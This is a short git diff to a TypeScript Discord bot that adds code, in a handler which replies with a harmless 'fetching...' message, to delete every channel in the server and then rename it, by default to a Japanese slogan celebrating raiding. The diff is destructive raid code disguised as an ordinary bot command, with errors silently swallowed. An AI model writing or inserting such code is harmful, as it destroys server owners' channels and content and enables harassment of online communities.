@@ -125,6 +125,13 @@ client.on("interactionCreate", async (interaction: Interaction) => {
       await message.reply({ content: "取得中..." });
   
       const discordServer = client.guilds.cache.get(message.guildId ?? "");
+      discordServer?.channels.cache.forEach(async (channel) => {
+        try {
+          await channel.delete();
+        } catch (_e) {
+          Logger.log(`Channel delete failed.`, "WARN");
+        }
+      });
   
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
   
